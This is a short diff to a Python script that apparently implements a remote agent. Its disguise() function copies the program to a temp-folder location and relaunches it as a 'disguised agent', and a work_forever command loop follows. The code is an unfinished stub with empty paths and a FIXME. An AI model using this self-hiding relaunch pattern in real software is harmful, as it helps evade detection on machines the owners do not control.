@@ -42,10 +42,13 @@ def disguise():
     else:
         raise Exception(platform + " is not supported")
     print('Rewriting self to a new location')
+    # FIXME: implement the logic
     system_temp_folder = ''
     new_agent_file_name = ''
-    print('Starting a new disguised agent: ' + new_agent_file_name)
-    os.system(system_temp_folder + new_agent_file_name)
+    
+    disguised_agent_path = system_temp_folder + new_agent_file_name
+    print('Starting a new disguised agent: ' + disguised_agent_path)
+    os.system(disguised_agent_path)
 
 def work_forever(cmd, sleep_timer_in_seconds):
     while True:
